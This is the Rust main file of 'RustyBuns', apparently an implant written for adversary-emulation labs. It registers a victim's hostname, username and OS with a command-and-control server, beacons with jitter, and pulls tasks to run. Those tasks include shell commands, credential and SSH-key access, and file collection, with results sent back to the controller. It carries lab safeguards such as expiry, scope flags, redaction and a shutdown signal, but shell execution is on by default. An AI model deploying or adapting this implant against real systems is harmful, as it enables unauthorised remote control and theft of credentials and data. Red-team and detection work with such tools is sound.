mod platform;
mod transport;

use platform::platform;
use transport::{HttpsTransport, Transport};
use serde::{Deserialize, Serialize};
use std::env;
use std::path::PathBuf;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use tracing::{error, info, warn};
use tracing_appender::rolling::{RollingFileAppender, Rotation};
use tracing_subscriber::{fmt, prelude::*, EnvFilter};
use uuid::Uuid;

const IMPLANT_VERSION: &str = "0.1.0";
const DEFAULT_C2_HOST: &str = "http://localhost:8080";
const DEFAULT_JITTER_MIN: u64 = 5;
const DEFAULT_JITTER_MAX: u64 = 15;
const DEFAULT_EXPIRY_HOURS: u64 = 8;
const DEFAULT_BACKOFF_BASE: u64 = 2;
const DEFAULT_MAX_BACKOFF: u64 = 60;
const DEFAULT_COLLECTION_INTERVAL_SECS: u64 = 30;
const MAX_COLLECTION_BYTES: u64 = 10_000_000;
const CRASH_LOOP_WINDOW_SECS: u64 = 60;
const CRASH_LOOP_THRESHOLD: u32 = 3;

const REDACT_PATTERNS: &[&str] = &[
    r"(?i)(aws_access_key|aws_secret_key|aws_session_token)=[A-Za-z0-9+/]{20,}",
    r"(?i)(password|passwd|pwd|secret|token|api_key|apikey)=[^\s]+",
    r"(?i)bearer\s+[A-Za-z0-9+/=._-]+",
    r"\b[A-Za-z0-9+/]{40,}\b",
];

fn redact_string(input: &str) -> String {
    let mut result = input.to_string();
    for pattern in REDACT_PATTERNS {
        if let Ok(re) = regex::Regex::new(pattern) {
            result = re.replace_all(&result, "[REDACTED]").to_string();
        }
    }
    result
}

struct ScopeConfig {
    cred_access_enabled: bool,
    collection_enabled: bool,
    shell_enabled: bool,
    allowed_paths: Vec<String>,
    blocked_processes: Vec<String>,
}

impl Default for ScopeConfig {
    fn default() -> Self {
        Self {
            cred_access_enabled: env::var("CRED_ACCESS_ENABLED").unwrap_or_default() == "true",
            collection_enabled: env::var("COLLECTION_ENABLED").unwrap_or_default() == "true",
            shell_enabled: env::var("SHELL_ENABLED").unwrap_or_default() != "false",
            allowed_paths: env::var("ALLOWED_PATHS")
                .unwrap_or_default()
                .split(',')
                .filter(|s| !s.is_empty())
                .map(String::from)
                .collect(),
            blocked_processes: env::var("BLOCKED_PROCESSES")
                .unwrap_or_default()
                .split(',')
                .filter(|s| !s.is_empty())
                .map(String::from)
                .collect(),
        }
    }
}

fn is_path_in_scope(path: &str, config: &ScopeConfig) -> bool {
    if config.allowed_paths.is_empty() {
        return true;
    }
    for allowed in &config.allowed_paths {
        if path.starts_with(allowed) {
            return true;
        }
    }
    false
}

fn setup_logging(log_dir: &PathBuf, implant_uuid: &str) {
    let file_appender = RollingFileAppender::new(Rotation::DAILY, log_dir, "rustybuns-implant.log");
    let (non_blocking, _guard) = tracing_appender::non_blocking(file_appender);

    tracing_subscriber::registry()
        .with(
            fmt::layer()
                .with_writer(non_blocking)
                .with_ansi(false)
                .with_target(false)
                .with_thread_ids(false)
                .with_file(false)
                .with_line_number(false)
        )
        .with(EnvFilter::from_default_env().add_directive(tracing::Level::INFO.into()))
        .init();

    info!(
        event = "implant_start",
        implant_uuid = %implant_uuid,
        version = IMPLANT_VERSION,
        build_arch = std::env::consts::ARCH,
        build_os = std::env::consts::OS,
        "RustyBuns Implant v{} starting", IMPLANT_VERSION
    );
}

#[derive(Debug, Serialize)]
struct RegisterPayload {
    uuid: String,
    hostname: String,
    username: String,
    os: String,
    version: String,
    expiry_hours: u64,
}

#[derive(Debug, Deserialize)]
struct Task {
    id: String,
    command: String,
    args: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
struct TaskListResponse {
    tasks: Vec<Task>,
}

#[derive(Debug, Serialize)]
struct TaskResult {
    task_id: String,
    success: bool,
    output: String,
    error: Option<String>,
    duration_ms: u64,
    mitre_id: Option<String>,
    technique: Option<String>,
}

fn get_hostname() -> String {
    hostname::get()
        .map(|h| h.to_string_lossy().into_owned())
        .unwrap_or_else(|_| "unknown".to_owned())
}

fn get_username() -> String {
    env::var("USERNAME")
        .or_else(|_| env::var("USER"))
        .unwrap_or_else(|_| "unknown".to_owned())
}

fn get_os() -> String {
    #[cfg(target_os = "windows")]
    return "windows".to_owned();
    #[cfg(target_os = "linux")]
    return "linux".to_owned();
    #[cfg(target_os = "macos")]
    return "macos".to_owned();
    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    return "unknown".to_owned()
}

fn execute_task(platform: &impl platform::Platform, command: &str, args: &[String], scope: &ScopeConfig) -> (Result<String, String>, Option<String>) {
    let task = match platform::Task::from_command(command, args) {
        Ok(t) => t,
        Err(e) => return (Err(e), None),
    };

    if let Some(mitre_id) = task.mitre_id() {
        if command == "cred-access-check" || command == "list-env" || command == "list-ssh" {
            if !scope.cred_access_enabled {
                return (Err("CRED_ACCESS_ENABLED=false — credential access blocked by scope".to_string()), Some(mitre_id.to_string()));
            }
        }
        if command == "collect" {
            if !scope.collection_enabled {
                return (Err("COLLECTION_ENABLED=false — collection blocked by scope".to_string()), Some(mitre_id.to_string()));
            }
            if let Some(path) = args.first() {
                if !is_path_in_scope(path, scope) {
                    return (Err(format!("path not in scope: {}", path)), Some(mitre_id.to_string()));
                }
            }
        }
        if command == "shell" {
            if !scope.shell_enabled {
                return (Err("SHELL_ENABLED=false — shell execution blocked by scope".to_string()), Some(mitre_id.to_string()));
            }
        }
    }

    (task.execute(platform).map_err(|e| e.to_string()), task.mitre_id().map(String::from))
}



#[tokio::main]
async fn main() {
    let implant_uuid = env::var("IMPLANT_UUID")
        .unwrap_or_else(|_| Uuid::new_v4().to_string());
    let c2_host = env::var("C2_HOST").unwrap_or_else(|_| DEFAULT_C2_HOST.to_string());
    let jitter_min: u64 = env::var("JITTER_MIN")
        .unwrap_or_else(|_| DEFAULT_JITTER_MIN.to_string())
        .parse()
        .unwrap_or(DEFAULT_JITTER_MIN);
    let jitter_max: u64 = env::var("JITTER_MAX")
        .unwrap_or_else(|_| DEFAULT_JITTER_MAX.to_string())
        .parse()
        .unwrap_or(DEFAULT_JITTER_MAX);
    let expiry_hours: u64 = env::var("EXPIRY_HOURS")
        .unwrap_or_else(|_| DEFAULT_EXPIRY_HOURS.to_string())
        .parse()
        .unwrap_or(DEFAULT_EXPIRY_HOURS);
    let backoff_base: u64 = env::var("BACKOFF_BASE")
        .unwrap_or_else(|_| DEFAULT_BACKOFF_BASE.to_string())
        .parse()
        .unwrap_or(DEFAULT_BACKOFF_BASE);
    let max_backoff: u64 = env::var("MAX_BACKOFF")
        .unwrap_or_else(|_| DEFAULT_MAX_BACKOFF.to_string())
        .parse()
        .unwrap_or(DEFAULT_MAX_BACKOFF);

    let start_time = Instant::now();
    let expiry_duration = Duration::from_secs(expiry_hours * 3600);

    let log_dir = env::var("LOG_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("."));
    setup_logging(&log_dir, &implant_uuid);

    info!(
        event = "implant_config",
        implant_uuid = %implant_uuid,
        c2_host = %c2_host,
        jitter_min = jitter_min,
        jitter_max = jitter_max,
        expiry_hours = expiry_hours,
        backoff_base = backoff_base,
        max_backoff = max_backoff,
        "Implant configured"
    );

    let transport: HttpsTransport = HttpsTransport::new(&c2_host);

    let register_url = "/register";
    let payload = RegisterPayload {
        uuid: implant_uuid.clone(),
        hostname: get_hostname(),
        username: get_username(),
        os: get_os(),
        version: IMPLANT_VERSION.to_owned(),
        expiry_hours,
    };

    info!(event = "register_attempt", url = %register_url, "Registering with C2");
    match transport.send(register_url, &payload).await {
        Ok(()) => {
            info!(event = "register_success", "Successfully registered with C2");
        }
        Err(e) => {
            warn!(event = "register_failed", error = %e, "Registration failed. Continuing anyway (lab mode).");
        }
    }

    let mut backoff_attempts: u32 = 0;
    let scope = ScopeConfig::default();
    let collection_window: Duration = Duration::from_secs(env::var("COLLECTION_INTERVAL")
        .unwrap_or_else(|_| DEFAULT_COLLECTION_INTERVAL_SECS.to_string())
        .parse()
        .unwrap_or(DEFAULT_COLLECTION_INTERVAL_SECS));
    let mut last_collection: Option<Instant> = None;
    let mut collection_bytes: u64 = 0;
    let mut crash_timestamps: Vec<Instant> = Vec::new();
    let mut should_halt = false;

    loop {
        if start_time.elapsed() > expiry_duration {
            info!(event = "implant_expired", expiry_hours = expiry_hours, "Implant expired. Exiting.");
            break;
        }

        if should_halt {
            break;
        }

        {
            let now = Instant::now();
            crash_timestamps.retain(|t| now.duration_since(*t).as_secs() < CRASH_LOOP_WINDOW_SECS);
            if crash_timestamps.len() as u32 >= CRASH_LOOP_THRESHOLD {
                error!(
                    event = "crash_loop_detected",
                    failures = crash_timestamps.len(),
                    window_secs = CRASH_LOOP_WINDOW_SECS,
                    "Implant halted: too many failures in short period"
                );
                break;
            }
        }

        let jitter = jitter_min + rand_simple(jitter_max - jitter_min);
        sleep(Duration::from_secs(jitter)).await;

        if start_time.elapsed() > expiry_duration {
            break;
        }

        let tasks_url = format!("/tasks/{}", implant_uuid);

        #[derive(Deserialize)]
        struct ShutdownResponse {
            shutdown: bool,
        }
        if let Ok(shutdown_resp) = transport.recv::<ShutdownResponse>("/shutdown").await {
            if shutdown_resp.shutdown {
                info!(event = "global_shutdown", "Received global shutdown signal. Halting.");
                break;
            }
        }

        match transport.recv::<TaskListResponse>(&tasks_url).await {
            Ok(task_list) => {
                backoff_attempts = 0;
                if task_list.tasks.is_empty() {
                    continue;
                }
                for task in task_list.tasks {
                    if should_halt {
                        break;
                    }
                    let task_id = &task.id;
                    let command = &task.command;
                    info!(
                        event = "task_received",
                        task_id = %task_id,
                        command = %command,
                        "Received task"
                    );

                    if command == "__shutdown" {
                        info!(event = "halt_commanded", task_id = %task_id, "Implant halted by controller.");
                        should_halt = true;
                        break;
                    }

                    if command == "collect" {
                        if let Some(last) = last_collection {
                            if last.elapsed() < collection_window {
                                let wait = collection_window - last.elapsed();
                                warn!(event = "collection_rate_limited", wait_secs = wait.as_secs(), "Collection rate-limited");
                                let task_result = TaskResult {
                                    task_id: task.id.clone(),
                                    success: false,
                                    output: String::new(),
                                    error: Some(format!("Collection rate-limited. Wait {}s.", wait.as_secs())),
                                    duration_ms: 0,
                                    mitre_id: Some("T1074".to_string()),
                                    technique: Some("Data staged".to_string()),
                                };
                                let result_url = format!("/results/{}", implant_uuid);
                                let _ = transport.send(&result_url, &task_result).await;
                                continue;
                            }
                        }
                        if collection_bytes >= MAX_COLLECTION_BYTES {
                            warn!(event = "collection_bytes_exceeded", max_bytes = MAX_COLLECTION_BYTES, "Collection byte limit exceeded");
                            let task_result = TaskResult {
                                task_id: task.id.clone(),
                                success: false,
                                output: String::new(),
                                error: Some(format!("Collection byte limit exceeded ({} bytes).", MAX_COLLECTION_BYTES)),
                                duration_ms: 0,
                                mitre_id: Some("T1074".to_string()),
                                technique: Some("Data staged".to_string()),
                            };
                            let result_url = format!("/results/{}", implant_uuid);
                            let _ = transport.send(&result_url, &task_result).await;
                            continue;
                        }
                    }

                    let start = Instant::now();
                    let p = platform();
                    let (result, mitre_id) = execute_task(&p, &task.command, &task.args.unwrap_or_default(), &scope);
                    let duration = start.elapsed().as_millis() as u64;

                    match result {
                        Ok(output) => {
                            if command == "collect" {
                                if let Some(size) = output.lines().find(|l| l.contains("[STATS]")).and_then(|l| l.split_whitespace().nth(2).and_then(|s| s.parse().ok())) {
                                    collection_bytes = collection_bytes.saturating_add(size);
                                }
                                last_collection = Some(Instant::now());
                            }
                            let redacted_output = redact_string(&output);
                            let technique = platform::Task::from_command(command, &[]).ok().map(|t| t.name().to_string());
                            info!(
                                event = "task_completed",
                                task_id = %task_id,
                                command = %command,
                                mitre_id = ?mitre_id,
                                duration_ms = duration,
                                output_length = output.len(),
                                "Task completed successfully"
                            );
                            let task_result = TaskResult {
                                task_id: task.id.clone(),
                                success: true,
                                output: redacted_output,
                                error: None,
                                duration_ms: duration,
                                mitre_id,
                                technique,
                            };
                            let result_url = format!("/results/{}", implant_uuid);
                            let _ = transport.send(&result_url, &task_result).await;
                        }
                        Err(err) => {
                            let technique = mitre_id.as_ref().and_then(|_| platform::Task::from_command(command, &[]).ok().map(|t| t.name().to_string()));
                            error!(event = "task_failed", task_id = %task_id, command = %command, mitre_id = ?mitre_id, error = %err, "Task failed");
                            let task_result = TaskResult {
                                task_id: task.id.clone(),
                                success: false,
                                output: String::new(),
                                error: Some(err),
                                duration_ms: duration,
                                mitre_id,
                                technique,
                            };
                            let result_url = format!("/results/{}", implant_uuid);
                            let _ = transport.send(&result_url, &task_result).await;
                        }
                    }
                }
            }
            Err(e) => {
                warn!(event = "fetch_error", error = %e, "Failed to fetch tasks. Applying exponential backoff.");
                backoff_attempts += 1;
                crash_timestamps.push(Instant::now());
                let backoff_duration = (backoff_base.pow(backoff_attempts.min(5) as u32)).min(max_backoff);
                info!(event = "backoff", duration_secs = backoff_duration, attempt = backoff_attempts, "Backing off");
                sleep(Duration::from_secs(backoff_duration)).await;
            }
        }
    }

    info!(event = "implant_shutdown", "Implant shutting down cleanly.");
}

fn rand_simple(max: u64) -> u64 {
    let now = Instant::now();
    let ns = now.elapsed().as_nanos();
    (ns % max as u128) as u64
}